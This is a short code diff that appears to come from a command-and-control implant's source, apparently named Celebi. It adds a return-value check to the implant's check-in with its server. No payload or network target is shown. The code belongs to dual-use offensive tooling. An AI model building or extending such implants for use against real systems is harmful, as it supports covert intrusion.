@@ -149,9 +149,9 @@ void go() {
 	#endif
 	
 	CheckinReply checkin_reply = { 0 };
-	perform_checkin(&state, &capabilities, &checkin_reply);
+	BOOL checkin_result = perform_checkin(&state, &capabilities, &checkin_reply);
 	
-	if ((checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
+	if ((checkin_result == FALSE) || (checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Checkin failed with: %s", checkin_reply.status);
 		#endif
